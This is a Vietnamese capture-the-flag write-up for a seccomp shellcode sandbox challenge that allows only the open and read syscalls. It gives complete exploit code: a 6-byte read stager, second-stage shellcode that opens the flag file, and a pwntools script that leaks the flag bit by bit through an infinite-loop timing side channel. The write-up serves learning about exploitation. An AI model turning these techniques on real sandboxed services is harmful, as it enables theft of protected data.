# SHELLCODE+TIMING ATTACK

Bài này ta được cung cáp file src như sau :
```C
// gcc chall.c -o chall -lseccomp

#define _GNU_SOURCE 1

#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <stdio.h>
#include <seccomp.h>

void *shellcode_mem;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    shellcode_mem = mmap((void *) 0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode_mem == (void *) 0x1337000);
    puts("hihihihi");
    puts("Welcome to the KCSCTF shellcode sandbox!");
    puts("======================================");
    puts("Allowed syscalls: open, read");
    puts("You've got 6 bytes, make them count!");
    puts("======================================");
    fflush(stdout);

    shellcode_size = read(0, shellcode_mem, 0x6);
    assert(shellcode_size > 0);

    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);

    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);    
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode_mem)();
}
```
ta có thể thấy rằng ở bài này tác giả đã cố ý sử dụng seccomp để cho ta chỉ có thể sử dụng hai syscall là sys.read và sysopen . Cùng với đó ta có thể thấy trước 
dó chương  trình đã gọi hàm mmap để tạo ra một khoảng bộ nhớ để có quyền RWX và sẽ đọc 6byte vô địa chỉ đó(0x1337000), rồi mới thiết lập seccomp ,cuối cùng nó sẽ thực thi 6byte shellcode mà ta đã ghi vô 0x1337000.
. Vậy ta chỉ còn có cách là dùng 6 byte shellcode đó gọi hàm read và ta sẽ ghi thêm shellcode vô địa chỉ(0x1337000+6) để điều khiển chương trình .

# PLAN 
1. dùng 6 byte shellcode đọc để gọi hàm read vô địa chỉ 0x1337000+6 tiếp tục điều khiển chương trình
2. ta sẽ đọc flag và brute force từng byte của chương trình để lấy flag

# Stage1: 

phần này thì chỉ cần debug chương trình , đặt break point ngay trước khi chương trình thục thi shell code của ta thì ta sẽ thấy các thanh ghi như sau :
```asm
rax: 0
rdx: 0x1337000
rdi: giá trị nào đó 
```
vậy để có thể gọi hàm read thì ta chỉ cần rsi chỏ đển địa chỉ buffer mà ta muốn đọc vô và rdi=0 để có thể đọc dưới dạng là stdin . vậy ta sẽ có shell code như sau :
```asm
mov esi,edx
xor edi,edi
syscall
```

và ta có shellcode như sau :
```python
shellcode=b"\x89\xD6\x31\xFF\x0F\x05"
```
ok ta thấy rằng shell code của ta khônng dính null byte và vừa đủ 6 byte.

# Stage2:
ta có code như sau :

```asm
        xor rax,rax         
        mov al,2
        xor rdi,rdi
        mov edi,0x1337110     ; địa chỉ sẽ chứ đường dẫn "./flag\x00" của ta 
        xor rsi,rsi
        xor rdx,rdx
        syscall               ; sys open 
        mov edi,eax           ; 
        xor rax,rax
        mov dl,0x99
        xor rsi,rsi
        mov esi,0x1337210     ; sau khi mở thì ta sẽ đọc flag vô địa chỉ 0x1337210
        syscall               ; sys read
```


```python
            shellcode=b"A"*6 # padding qua 6 byte trước đó 
            shellcode+=shellcode__(index,bit_offset)# shellcode ở phía  trên 
            shellcode=shellcode.ljust(0x110) # padding đế địa chỏ chứa đường dẫn của ta 
            shellcode+=b'./flag\x00' # đường dẫn 
```

OK vậy là xong bước 2 . debug trên local thì ta sẽ thấy chương trình đã đọc flag vô địa chỉ 0x1337210;


Bước còn lại là lấy flag ra . Ta sẽ sử dụng timing attack , ta sẽ cho chương trình đọc từng byte của flag vô thanh ghi bl sau đó đối chiếu với từng ký tự asccii có thể in ra .
nhưng cách này thì rât lâu bơi ta sẽ phải đối chiếu với rất tất cả các ký tự asccii trong string.printable.Và lúc thi thì mình làm cách này =))

Nhưng sau khi xem solution thì mình sẽ dùng cách khác đó là đối chiếu từng từng bit , dùng cách này thì ta sẽ chỉ cần 8 lần brute ta đã có thể lấy được 1 chữ .

mình sẽ lấy VD để dễ giải thích hơn :

ta biết chữ đầu tiên trong flag sẽ là "K" dưới dạng bin thì sẽ là '0100 1011', ta sẽ đối chiếu từng bit như sau 

```asm
        mov eax,0x1337210
        add eax,{index}
        mov bl, byte ptr[rax]
        ; vd ta muốn lấy second least significant bit(bit thứ 2 từ phải qua) tương ứng với index=1
        shr bl,{bit_offset}    ;(0100 1011) >> 1= 0010 0101
        shl bl,7               ; 0010 0101 << 7= 1000 0000
        shr bl,7               ; 1000 0000 >> 7= 0000 0001
        INFI_LOOP:
            cmp bl,0           ; nếu bit đó là 1 thì ta sẽ cho chương trình chạy vô hạn 
            je end             ; 0 thi thoát
            jmp INFI_LOOP
        end:
```

vậy để kiểm tra xem chương trình có rơi vào INFI_LOOP không thì ta chỉ cần :
```python
start=time.time()# thời gian ngay sau khi ta send payload lần 2
p.recvall(timeout=1).decode()# nếu chương trình rơi vào vong INFI loop thì sẽ có  1 giay khác bieejt giữa giá trị của now và start.
now=time.time()
```



vậy ta sẽ có code như sau :
```python
def shellcode__(index,bit_offset):
    shellcode=asm(
        f'''
        xor rax,rax
        mov al,2
        xor rdi,rdi
        mov edi,0x1337110
        xor rsi,rsi
        xor rdx,rdx
        syscall
        mov edi,eax
        xor rax,rax
        mov dl,0x99
        xor rsi,rsi
        mov esi,0x1337210
        syscall

        mov eax,0x1337210
        add eax,{index}
        mov bl, byte ptr[rax]
        shr bl,{bit_offset}
        shl bl,7
        shr bl,7
        cmp bl,0
        INFI_LOOP:
            cmp bl,0
            je end
            jmp INFI_LOOP
        end:
        '''
        )
    return shellcode
def timing_attack(index):
    string_bin=''
    for bit_offset in range(8):
        
            #p=remote("103.162.14.240", 15000)
            p=process(exe.path)
            #GDB()
            shellcode=b"\x89\xD6\x31\xFF\x0F\x05"
            p.send(shellcode)
            shellcode=b"A"*6
            shellcode+=shellcode__(index,bit_offset)
            shellcode=shellcode.ljust(0x110)
            shellcode+=b'./flag.txt\x00'
            p.send(shellcode)
            start=time.time()
            p.recvall(timeout=1).decode()
            now=time.time()
            if (now-start>1):
                string_bin='1'+string_bin
            else:
                string_bin='0'+string_bin
    byte=int(string_bin,2)
    return byte
```

author scipt in s.py

my script in p.py

chạy script và ĐỢI thì ta sẽ có flag:

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/5b920ea4-d031-46ca-8666-ab2bb1aef9bf)

flag`KCSC{S1de_channel_hihihi_d6e25f87c7ebeef6e80df23d32c42d00}`




